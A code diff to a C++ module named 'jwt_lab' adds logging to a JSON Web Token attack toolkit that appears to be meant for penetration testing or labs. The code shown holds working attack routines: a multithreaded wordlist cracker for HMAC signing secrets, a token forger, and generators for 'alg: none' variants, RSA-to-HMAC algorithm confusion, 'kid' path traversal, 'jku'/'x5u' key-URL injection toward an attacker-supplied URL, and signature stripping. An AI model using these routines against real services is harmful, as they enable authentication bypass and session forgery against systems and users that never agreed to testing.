@@ -93,17 +93,23 @@ int b64url_index(char c)
 
 bool split_jwt_parts(const std::string& token, std::string& h, std::string& p, std::string& s_part)
 {
+    diag::log_tagged_fmt("jwt_lab", "split_jwt_parts token_len=%zu", token.size());
     h.clear(); p.clear(); s_part.clear();
     size_t first = token.find('.');
-    if (first == std::string::npos) return false;
+    if (first == std::string::npos) {
+        diag::log_tagged_fmt("jwt_lab", "split_jwt_parts no_first_dot token_len=%zu", token.size());
+        return false;
+    }
     size_t second = token.find('.', first + 1);
     h = token.substr(0, first);
     if (second == std::string::npos) {
+        diag::log_tagged_fmt("jwt_lab", "split_jwt_parts two_part_token header_len=%zu payload_len=%zu", h.size(), token.size() - first - 1);
         p = token.substr(first + 1);
         return !p.empty();
     }
     p = token.substr(first + 1, second - first - 1);
     s_part = token.substr(second + 1);
+    diag::log_tagged_fmt("jwt_lab", "split_jwt_parts ok header_len=%zu payload_len=%zu sig_len=%zu", h.size(), p.size(), s_part.size());
     return true;
 }
 
@@ -304,6 +310,8 @@ size_t ecdsa_component_len_for_alg(const std::string& alg)
 
 void run_crack_worker(std::shared_ptr<crack_record_t> rec)
 {
+    diag::log_tagged_fmt("jwt_lab", "run_crack_worker start id=%llu alg=%s words=%zu",
+        static_cast<unsigned long long>(rec->id), rec->alg.c_str(), rec->words.size());
     rec->active_workers.fetch_add(1, std::memory_order_acq_rel);
     const std::string sha = sha_name_for_alg(rec->alg);
     std::string signing_input;
@@ -313,14 +321,23 @@ void run_crack_worker(std::shared_ptr<crack_record_t> rec)
     signing_input.append(rec->payload_b64);
     std::vector<uint8_t> sig_bytes;
     if (!base64url_decode(rec->signature_b64, sig_bytes)) {
+        diag::log_tagged_fmt("jwt_lab", "run_crack_worker sig_decode_failed id=%llu", static_cast<unsigned long long>(rec->id));
         rec->active_workers.fetch_sub(1, std::memory_order_acq_rel);
         rec->running.store(false, std::memory_order_release);
         return;
     }
+    diag::log_tagged_fmt("jwt_lab", "run_crack_worker sig_decoded id=%llu sig_bytes=%zu sha=%s",
+        static_cast<unsigned long long>(rec->id), sig_bytes.size(), sha.c_str());
     while (!rec->stop_requested.load(std::memory_order_acquire)) {
         const size_t idx = rec->next_index.fetch_add(1, std::memory_order_acq_rel);
-        if (idx >= rec->words.size()) break;
-        if (rec->attempts.load(std::memory_order_acquire) >= rec->max_attempts) break;
+        if (idx >= rec->words.size()) {
+            diag::log_tagged_fmt("jwt_lab", "run_crack_worker wordlist_exhausted id=%llu idx=%zu", static_cast<unsigned long long>(rec->id), idx);
+            break;
+        }
+        if (rec->attempts.load(std::memory_order_acquire) >= rec->max_attempts) {
+            diag::log_tagged_fmt("jwt_lab", "run_crack_worker max_attempts_reached id=%llu", static_cast<unsigned long long>(rec->id));
+            break;
+        }
         const std::string& word = rec->words[idx];
         rec->attempts.fetch_add(1, std::memory_order_acq_rel);
         std::vector<uint8_t> mac;
@@ -332,6 +349,8 @@ void run_crack_worker(std::shared_ptr<crack_record_t> rec)
             uint8_t diff = 0;
             for (size_t i = 0; i < mac.size(); ++i) diff |= static_cast<uint8_t>(mac[i] ^ sig_bytes[i]);
             if (diff == 0) {
+                diag::log_tagged_fmt("jwt_lab", "run_crack_worker secret_found id=%llu secret_len=%zu idx=%zu",
+                    static_cast<unsigned long long>(rec->id), word.size(), idx);
                 std::lock_guard<std::mutex> lk(rec->found_mtx);
                 if (rec->secret_found.empty()) {
                     rec->secret_found = word;
@@ -341,7 +360,10 @@ void run_crack_worker(std::shared_ptr<crack_record_t> rec)
             }
         }
     }
-    if (rec->active_workers.fetch_sub(1, std::memory_order_acq_rel) == 1) {
+    const int remaining = rec->active_workers.fetch_sub(1, std::memory_order_acq_rel);
+    if (remaining == 1) {
+        diag::log_tagged_fmt("jwt_lab", "run_crack_worker last_worker_done id=%llu attempts=%zu",
+            static_cast<unsigned long long>(rec->id), rec->attempts.load(std::memory_order_acquire));
         rec->running.store(false, std::memory_order_release);
     }
 }
@@ -412,8 +434,12 @@ bool initialize()
 
 void shutdown()
 {
+    diag::log_tagged_fmt("jwt_lab", "shutdown entry");
     auto& st = s();
-    if (!st.initialized.exchange(false)) return;
+    if (!st.initialized.exchange(false)) {
+        diag::log_tagged_fmt("jwt_lab", "shutdown already_stopped");
+        return;
+    }
     std::vector<std::shared_ptr<crack_record_t>> records;
     {
         std::lock_guard<std::mutex> lk(st.cracks_mtx);
@@ -421,37 +447,48 @@ void shutdown()
         for (auto& kv : st.cracks) records.push_back(kv.second);
         st.cracks.clear();
     }
+    diag::log_tagged_fmt("jwt_lab", "shutdown stopping_cracks count=%zu", records.size());
     for (auto& r : records) {
         if (r) r->stop_requested.store(true, std::memory_order_release);
     }
+    diag::log_tagged_fmt("jwt_lab", "shutdown complete");
 }
 
 jwt_parsed_t decode(const std::string& token)
 {
+    diag::log_tagged_fmt("jwt_lab", "decode entry token_len=%zu", token.size());
     jwt_parsed_t out;
     out.raw = token;
     if (token.empty()) {
+        diag::log_tagged_fmt("jwt_lab", "decode error empty_token");
         set_err("decode: empty token");
         return out;
     }
     if (!split_jwt_parts(token, out.header_b64, out.payload_b64, out.signature_b64)) {
+        diag::log_tagged_fmt("jwt_lab", "decode error invalid_structure");
         set_err("decode: invalid jwt structure");
         return out;
     }
+    diag::log_tagged_fmt("jwt_lab", "decode split_ok header_b64_len=%zu payload_b64_len=%zu sig_b64_len=%zu",
+        out.header_b64.size(), out.payload_b64.size(), out.signature_b64.size());
     std::vector<uint8_t> h_bytes;
     std::vector<uint8_t> p_bytes;
     if (!base64url_decode(out.header_b64, h_bytes)) {
+        diag::log_tagged_fmt("jwt_lab", "decode error header_b64url_invalid");
         set_err("decode: header b64url invalid");
         return out;
     }
     if (!base64url_decode(out.payload_b64, p_bytes)) {
+        diag::log_tagged_fmt("jwt_lab", "decode error payload_b64url_invalid");
         set_err("decode: payload b64url invalid");
         return out;
     }
+    diag::log_tagged_fmt("jwt_lab", "decode b64_decoded header_bytes=%zu payload_bytes=%zu", h_bytes.size(), p_bytes.size());
     try {
         out.header = nlohmann::json::parse(std::string(h_bytes.begin(), h_bytes.end()), nullptr, false);
         out.payload = nlohmann::json::parse(std::string(p_bytes.begin(), p_bytes.end()), nullptr, false);
     } catch (...) {
+        diag::log_tagged_fmt("jwt_lab", "decode error json_parse_threw");
         set_err("decode: json parse threw");
         return out;
     }
@@ -461,11 +498,14 @@ jwt_parsed_t decode(const std::string& token)
     }
     out.valid_structure = !out.header.is_discarded() && !out.payload.is_discarded()
                        && out.header.is_object() && out.payload.is_object();
+    diag::log_tagged_fmt("jwt_lab", "decode done valid=%d alg=%s kid_len=%zu",
+        (int)out.valid_structure, out.alg.c_str(), out.kid.size());
     return out;
 }
 
 std::string forge(const jwt_forge_input_t& in)
 {
+    diag::log_tagged_fmt("jwt_lab", "forge entry alg=%s", in.alg.c_str());
     nlohmann::json hdr = in.header.is_object() ? in.header : nlohmann::json::object();
     hdr["alg"] = in.alg;
     if (!hdr.contains("typ")) hdr["typ"] = "JWT";
@@ -485,19 +525,26 @@ std::string forge(const jwt_forge_input_t& in)
     const std::string& alg = in.alg;
 
     if (alg == "none") {
+        diag::log_tagged_fmt("jwt_lab", "forge alg_none no_signature");
         sig_b64.clear();
     } else if (alg == "HS256" || alg == "HS384" || alg == "HS512") {
+        diag::log_tagged_fmt("jwt_lab", "forge alg_hmac alg=%s secret_len=%zu signing_input_len=%zu",
+            alg.c_str(), in.hmac_secret.size(), signing_input.size());
         std::vector<uint8_t> mac;
         if (!hmac_compute(sha_name_for_alg(alg),
                           reinterpret_cast<const uint8_t*>(in.hmac_secret.data()), in.hmac_secret.size(),
                           reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), mac)) {
+            diag::log_tagged_fmt("jwt_lab", "forge error hmac_compute_failed alg=%s", alg.c_str());
             set_err("forge: hmac compute failed");
             return std::string();
         }
         sig_b64 = base64url_encode(mac.data(), mac.size());
+        diag::log_tagged_fmt("jwt_lab", "forge hmac_ok mac_bytes=%zu sig_b64_len=%zu", mac.size(), sig_b64.size());
     } else if (alg == "RS256" || alg == "RS384" || alg == "RS512") {
+        diag::log_tagged_fmt("jwt_lab", "forge alg_rsa alg=%s pem_len=%zu", alg.c_str(), in.rsa_private_pem.size());
         EVP_PKEY* pkey = load_pem_private(in.rsa_private_pem);
         if (!pkey) {
+            diag::log_tagged_fmt("jwt_lab", "forge error rsa_key_parse_failed");
             set_err("forge: rsa private key parse failed");
             return std::string();
         }
@@ -506,13 +553,17 @@ std::string forge(const jwt_forge_input_t& in)
                                  reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), sig);
         EVP_PKEY_free(pkey);
         if (!ok) {
+            diag::log_tagged_fmt("jwt_lab", "forge error rsa_sign_failed alg=%s", alg.c_str());
             set_err("forge: rsa sign failed");
             return std::string();
         }
         sig_b64 = base64url_encode(sig.data(), sig.size());
+        diag::log_tagged_fmt("jwt_lab", "forge rsa_ok sig_bytes=%zu", sig.size());
     } else if (alg == "ES256" || alg == "ES384" || alg == "ES512") {
+        diag::log_tagged_fmt("jwt_lab", "forge alg_ecdsa alg=%s pem_len=%zu", alg.c_str(), in.ecdsa_private_pem.size());
         EVP_PKEY* pkey = load_pem_private(in.ecdsa_private_pem);
         if (!pkey) {
+            diag::log_tagged_fmt("jwt_lab", "forge error ecdsa_key_parse_failed");
             set_err("forge: ecdsa private key parse failed");
             return std::string();
         }
@@ -521,16 +572,20 @@ std::string forge(const jwt_forge_input_t& in)
                                  reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), der_sig);
         EVP_PKEY_free(pkey);
         if (!ok) {
+            diag::log_tagged_fmt("jwt_lab", "forge error ecdsa_sign_failed alg=%s", alg.c_str());
             set_err("forge: ecdsa sign failed");
             return std::string();
         }
         std::vector<uint8_t> raw_sig;
         if (!ecdsa_der_to_raw(der_sig, ecdsa_component_len_for_alg(alg), raw_sig)) {
+            diag::log_tagged_fmt("jwt_lab", "forge error ecdsa_der_to_raw_failed der_len=%zu", der_sig.size());
             set_err("forge: ecdsa der-to-raw failed");
             return std::string();
         }
         sig_b64 = base64url_encode(raw_sig.data(), raw_sig.size());
+        diag::log_tagged_fmt("jwt_lab", "forge ecdsa_ok raw_sig_bytes=%zu", raw_sig.size());
     } else {
+        diag::log_tagged_fmt("jwt_lab", "forge error unsupported_alg alg=%s", alg.c_str());
         set_err("forge: unsupported alg");
         return std::string();
     }
@@ -538,14 +593,23 @@ std::string forge(const jwt_forge_input_t& in)
     std::string out = signing_input;
     out.push_back('.');
     out.append(sig_b64);
+    diag::log_tagged_fmt("jwt_lab", "forge success alg=%s token_len=%zu", alg.c_str(), out.size());
     return out;
 }
 
 bool verify_hmac(const std::string& token, const std::string& secret)
 {
+    diag::log_tagged_fmt("jwt_lab", "verify_hmac entry token_len=%zu secret_len=%zu", token.size(), secret.size());
     jwt_parsed_t parsed = decode(token);
-    if (!parsed.valid_structure) return false;
-    if (parsed.alg != "HS256" && parsed.alg != "HS384" && parsed.alg != "HS512") return false;
+    if (!parsed.valid_structure) {
+        diag::log_tagged_fmt("jwt_lab", "verify_hmac error invalid_structure");
+        return false;
+    }
+    if (parsed.alg != "HS256" && parsed.alg != "HS384" && parsed.alg != "HS512") {
+        diag::log_tagged_fmt("jwt_lab", "verify_hmac error wrong_alg alg=%s", parsed.alg.c_str());
+        return false;
+    }
+    diag::log_tagged_fmt("jwt_lab", "verify_hmac alg=%s computing_mac", parsed.alg.c_str());
     std::string signing_input = parsed.header_b64;
     signing_input.push_back('.');
     signing_input.append(parsed.payload_b64);
@@ -553,53 +617,95 @@ bool verify_hmac(const std::string& token, const std::string& secret)
     if (!hmac_compute(sha_name_for_alg(parsed.alg),
                       reinterpret_cast<const uint8_t*>(secret.data()), secret.size(),
                       reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(), mac)) {
+        diag::log_tagged_fmt("jwt_lab", "verify_hmac error hmac_compute_failed");
         return false;
     }
     std::vector<uint8_t> sig_bytes;
-    if (!base64url_decode(parsed.signature_b64, sig_bytes)) return false;
-    if (mac.size() != sig_bytes.size()) return false;
+    if (!base64url_decode(parsed.signature_b64, sig_bytes)) {
+        diag::log_tagged_fmt("jwt_lab", "verify_hmac error sig_decode_failed");
+        return false;
+    }
+    if (mac.size() != sig_bytes.size()) {
+        diag::log_tagged_fmt("jwt_lab", "verify_hmac error mac_size_mismatch mac=%zu sig=%zu", mac.size(), sig_bytes.size());
+        return false;
+    }
     uint8_t diff = 0;
     for (size_t i = 0; i < mac.size(); ++i) diff |= static_cast<uint8_t>(mac[i] ^ sig_bytes[i]);
+    diag::log_tagged_fmt("jwt_lab", "verify_hmac result=%s alg=%s", diff == 0 ? "valid" : "invalid", parsed.alg.c_str());
     return diff == 0;
 }
 
 bool verify_rsa(const std::string& token, const std::string& public_pem)
 {
+    diag::log_tagged_fmt("jwt_lab", "verify_rsa entry token_len=%zu pem_len=%zu", token.size(), public_pem.size());
     jwt_parsed_t parsed = decode(token);
-    if (!parsed.valid_structure) return false;
-    if (parsed.alg != "RS256" && parsed.alg != "RS384" && parsed.alg != "RS512") return false;
+    if (!parsed.valid_structure) {
+        diag::log_tagged_fmt("jwt_lab", "verify_rsa error invalid_structure");
+        return false;
+    }
+    if (parsed.alg != "RS256" && parsed.alg != "RS384" && parsed.alg != "RS512") {
+        diag::log_tagged_fmt("jwt_lab", "verify_rsa error wrong_alg alg=%s", parsed.alg.c_str());
+        return false;
+    }
     EVP_PKEY* pkey = load_pem_public(public_pem);
-    if (!pkey) return false;
+    if (!pkey) {
+        diag::log_tagged_fmt("jwt_lab", "verify_rsa error public_key_parse_failed");
+        return false;
+    }
     std::string signing_input = parsed.header_b64;
     signing_input.push_back('.');
     signing_input.append(parsed.payload_b64);
     std::vector<uint8_t> sig_bytes;
-    if (!base64url_decode(parsed.signature_b64, sig_bytes)) { EVP_PKEY_free(pkey); return false; }
+    if (!base64url_decode(parsed.signature_b64, sig_bytes)) {
+        diag::log_tagged_fmt("jwt_lab", "verify_rsa error sig_decode_failed");
+        EVP_PKEY_free(pkey);
+        return false;
+    }
     const bool ok = verify_rsa_internal(pkey, md_for_sha(sha_name_for_alg(parsed.alg)),
                                         reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(),
                                         sig_bytes.data(), sig_bytes.size());
     EVP_PKEY_free(pkey);
+    diag::log_tagged_fmt("jwt_lab", "verify_rsa result=%s alg=%s", ok ? "valid" : "invalid", parsed.alg.c_str());
     return ok;
 }
 
 bool verify_ecdsa(const std::string& token, const std::string& public_pem)
 {
+    diag::log_tagged_fmt("jwt_lab", "verify_ecdsa entry token_len=%zu pem_len=%zu", token.size(), public_pem.size());
     jwt_parsed_t parsed = decode(token);
-    if (!parsed.valid_structure) return false;
-    if (parsed.alg != "ES256" && parsed.alg != "ES384" && parsed.alg != "ES512") return false;
+    if (!parsed.valid_structure) {
+        diag::log_tagged_fmt("jwt_lab", "verify_ecdsa error invalid_structure");
+        return false;
+    }
+    if (parsed.alg != "ES256" && parsed.alg != "ES384" && parsed.alg != "ES512") {
+        diag::log_tagged_fmt("jwt_lab", "verify_ecdsa error wrong_alg alg=%s", parsed.alg.c_str());
+        return false;
+    }
     EVP_PKEY* pkey = load_pem_public(public_pem);
-    if (!pkey) return false;
+    if (!pkey) {
+        diag::log_tagged_fmt("jwt_lab", "verify_ecdsa error public_key_parse_failed");
+        return false;
+    }
     std::string signing_input = parsed.header_b64;
     signing_input.push_back('.');
     signing_input.append(parsed.payload_b64);
     std::vector<uint8_t> raw_sig;
-    if (!base64url_decode(parsed.signature_b64, raw_sig)) { EVP_PKEY_free(pkey); return false; }
+    if (!base64url_decode(parsed.signature_b64, raw_sig)) {
+        diag::log_tagged_fmt("jwt_lab", "verify_ecdsa error sig_decode_failed");
+        EVP_PKEY_free(pkey);
+        return false;
+    }
     std::vector<uint8_t> der_sig;
-    if (!ecdsa_raw_to_der(raw_sig, der_sig)) { EVP_PKEY_free(pkey); return false; }
+    if (!ecdsa_raw_to_der(raw_sig, der_sig)) {
+        diag::log_tagged_fmt("jwt_lab", "verify_ecdsa error raw_to_der_failed raw_len=%zu", raw_sig.size());
+        EVP_PKEY_free(pkey);
+        return false;
+    }
     const bool ok = verify_rsa_internal(pkey, md_for_sha(sha_name_for_alg(parsed.alg)),
                                         reinterpret_cast<const uint8_t*>(signing_input.data()), signing_input.size(),
                                         der_sig.data(), der_sig.size());
     EVP_PKEY_free(pkey);
+    diag::log_tagged_fmt("jwt_lab", "verify_ecdsa result=%s alg=%s", ok ? "valid" : "invalid", parsed.alg.c_str());
     return ok;
 }
 
@@ -650,6 +756,7 @@ uint64_t start_crack(const crack_config_t& cfg)
 
 crack_status_t crack_status(uint64_t id)
 {
+    diag::log_tagged_fmt("jwt_lab", "crack_status entry id=%llu", static_cast<unsigned long long>(id));
     auto& st = s();
     std::shared_ptr<crack_record_t> rec;
     {
@@ -658,7 +765,10 @@ crack_status_t crack_status(uint64_t id)
         if (it != st.cracks.end()) rec = it->second;
     }
     crack_status_t out;
-    if (!rec) return out;
+    if (!rec) {
+        diag::log_tagged_fmt("jwt_lab", "crack_status not_found id=%llu", static_cast<unsigned long long>(id));
+        return out;
+    }
     out.id = rec->id;
     out.attempts = rec->attempts.load(std::memory_order_acquire);
     out.running = rec->running.load(std::memory_order_acquire);
@@ -666,11 +776,14 @@ crack_status_t crack_status(uint64_t id)
         std::lock_guard<std::mutex> lk(rec->found_mtx);
         out.secret_found = rec->secret_found;
     }
+    diag::log_tagged_fmt("jwt_lab", "crack_status id=%llu running=%d attempts=%zu secret_found=%d",
+        static_cast<unsigned long long>(id), (int)out.running, out.attempts, !out.secret_found.empty());
     return out;
 }
 
 void crack_stop(uint64_t id)
 {
+    diag::log_tagged_fmt("jwt_lab", "crack_stop entry id=%llu", static_cast<unsigned long long>(id));
     auto& st = s();
     std::shared_ptr<crack_record_t> rec;
     {
@@ -678,11 +791,17 @@ void crack_stop(uint64_t id)
         auto it = st.cracks.find(id);
         if (it != st.cracks.end()) rec = it->second;
     }
-    if (rec) rec->stop_requested.store(true, std::memory_order_release);
+    if (rec) {
+        rec->stop_requested.store(true, std::memory_order_release);
+        diag::log_tagged_fmt("jwt_lab", "crack_stop signaled id=%llu", static_cast<unsigned long long>(id));
+    } else {
+        diag::log_tagged_fmt("jwt_lab", "crack_stop not_found id=%llu", static_cast<unsigned long long>(id));
+    }
 }
 
 std::vector<crack_status_t> list_cracks()
 {
+    diag::log_tagged_fmt("jwt_lab", "list_cracks entry");
     auto& st = s();
     std::vector<std::shared_ptr<crack_record_t>> snap;
     {
@@ -690,6 +809,7 @@ std::vector<crack_status_t> list_cracks()
         snap.reserve(st.cracks.size());
         for (auto& kv : st.cracks) snap.push_back(kv.second);
     }
+    diag::log_tagged_fmt("jwt_lab", "list_cracks snap_size=%zu", snap.size());
     std::vector<crack_status_t> out;
     out.reserve(snap.size());
     for (auto& rec : snap) {
@@ -704,14 +824,20 @@ std::vector<crack_status_t> list_cracks()
         }
         out.push_back(std::move(s_out));
     }
+    diag::log_tagged_fmt("jwt_lab", "list_cracks result count=%zu", out.size());
     return out;
 }
 
 std::vector<std::string> attack_alg_none(const std::string& token)
 {
+    diag::log_tagged_fmt("jwt_lab", "attack_alg_none entry token_len=%zu", token.size());
     std::vector<std::string> out;
     jwt_parsed_t parsed = decode(token);
-    if (!parsed.valid_structure) return out;
+    if (!parsed.valid_structure) {
+        diag::log_tagged_fmt("jwt_lab", "attack_alg_none error invalid_structure");
+        return out;
+    }
+    diag::log_tagged_fmt("jwt_lab", "attack_alg_none original_alg=%s generating_variants", parsed.alg.c_str());
     const std::vector<std::string> variants = { "none", "None", "NONE", "nOnE" };
     for (const auto& v : variants) {
         nlohmann::json hdr = parsed.header;
@@ -725,15 +851,24 @@ std::vector<std::string> attack_alg_none(const std::string& token)
         t.push_back('.');
         out.push_back(std::move(t));
     }
+    diag::log_tagged_fmt("jwt_lab", "attack_alg_none result count=%zu", out.size());
     return out;
 }
 
 std::vector<std::string> attack_alg_confusion(const std::string& token, const std::string& rsa_public_pem)
 {
+    diag::log_tagged_fmt("jwt_lab", "attack_alg_confusion entry token_len=%zu pem_len=%zu", token.size(), rsa_public_pem.size());
     std::vector<std::string> out;
     jwt_parsed_t parsed = decode(token);
-    if (!parsed.valid_structure) return out;
-    if (rsa_public_pem.empty()) return out;
+    if (!parsed.valid_structure) {
+        diag::log_tagged_fmt("jwt_lab", "attack_alg_confusion error invalid_structure");
+        return out;
+    }
+    if (rsa_public_pem.empty()) {
+        diag::log_tagged_fmt("jwt_lab", "attack_alg_confusion error empty_pem");
+        return out;
+    }
+    diag::log_tagged_fmt("jwt_lab", "attack_alg_confusion original_alg=%s generating_confusion_tokens", parsed.alg.c_str());
     const std::vector<std::string> downgrade = { "HS256", "HS384", "HS512" };
     for (const auto& algv : downgrade) {
         nlohmann::json hdr = parsed.header;
@@ -769,14 +904,20 @@ std::vector<std::string> attack_alg_confusion(const std::string& token, const st
             }
         }
     }
+    diag::log_tagged_fmt("jwt_lab", "attack_alg_confusion result count=%zu", out.size());
     return out;
 }
 
 std::vector<std::string> attack_kid_traversal(const std::string& token)
 {
+    diag::log_tagged_fmt("jwt_lab", "attack_kid_traversal entry token_len=%zu", token.size());
     std::vector<std::string> out;
     jwt_parsed_t parsed = decode(token);
-    if (!parsed.valid_structure) return out;
+    if (!parsed.valid_structure) {
+        diag::log_tagged_fmt("jwt_lab", "attack_kid_traversal error invalid_structure");
+        return out;
+    }
+    diag::log_tagged_fmt("jwt_lab", "attack_kid_traversal alg=%s generating_traversal_payloads", parsed.alg.c_str());
     const std::vector<std::string> kids = {
         "../../dev/null",
         "../../../../../../dev/null",
@@ -809,14 +950,20 @@ std::vector<std::string> attack_kid_traversal(const std::string& token)
         forged.append(base64url_encode(mac.data(), mac.size()));
         out.push_back(std::move(forged));
     }
+    diag::log_tagged_fmt("jwt_lab", "attack_kid_traversal result count=%zu", out.size());
     return out;
 }
 
 std::vector<std::string> attack_jku_injection(const std::string& token, const std::string& attacker_jku_url)
 {
+    diag::log_tagged_fmt("jwt_lab", "attack_jku_injection entry token_len=%zu jku_url_len=%zu", token.size(), attacker_jku_url.size());
     std::vector<std::string> out;
     jwt_parsed_t parsed = decode(token);
-    if (!parsed.valid_structure) return out;
+    if (!parsed.valid_structure) {
+        diag::log_tagged_fmt("jwt_lab", "attack_jku_injection error invalid_structure");
+        return out;
+    }
+    diag::log_tagged_fmt("jwt_lab", "attack_jku_injection alg=%s generating_jku_variants", parsed.alg.c_str());
     const std::vector<std::string> header_keys = { "jku", "x5u", "jwk", "x5c" };
     for (const auto& key : header_keys) {
         nlohmann::json hdr = parsed.header;
@@ -840,14 +987,20 @@ std::vector<std::string> attack_jku_injection(const std::string& token, const st
         out_token.append(parsed.signature_b64);
         out.push_back(std::move(out_token));
     }
+    diag::log_tagged_fmt("jwt_lab", "attack_jku_injection result count=%zu", out.size());
     return out;
 }
 
 std::vector<std::string> attack_signature_strip(const std::string& token)
 {
+    diag::log_tagged_fmt("jwt_lab", "attack_signature_strip entry token_len=%zu", token.size());
     std::vector<std::string> out;
     jwt_parsed_t parsed = decode(token);
-    if (!parsed.valid_structure) return out;
+    if (!parsed.valid_structure) {
+        diag::log_tagged_fmt("jwt_lab", "attack_signature_strip error invalid_structure");
+        return out;
+    }
+    diag::log_tagged_fmt("jwt_lab", "attack_signature_strip alg=%s stripping_signature", parsed.alg.c_str());
     std::string t;
     t.reserve(parsed.header_b64.size() + 1 + parsed.payload_b64.size() + 1);
     t.append(parsed.header_b64);
@@ -859,13 +1012,16 @@ std::vector<std::string> attack_signature_strip(const std::string& token)
     t2.push_back('.');
     t2.append(parsed.payload_b64);
     out.push_back(std::move(t2));
+    diag::log_tagged_fmt("jwt_lab", "attack_signature_strip result count=%zu", out.size());
     return out;
 }
 
 std::string last_error()
 {
+    diag::log_tagged_fmt("jwt_lab", "last_error queried");
     auto& st = s();
     std::lock_guard<std::mutex> lk(st.err_mtx);
+    diag::log_tagged_fmt("jwt_lab", "last_error value_len=%zu", st.last_err.size());
     return st.last_err;
 }
 
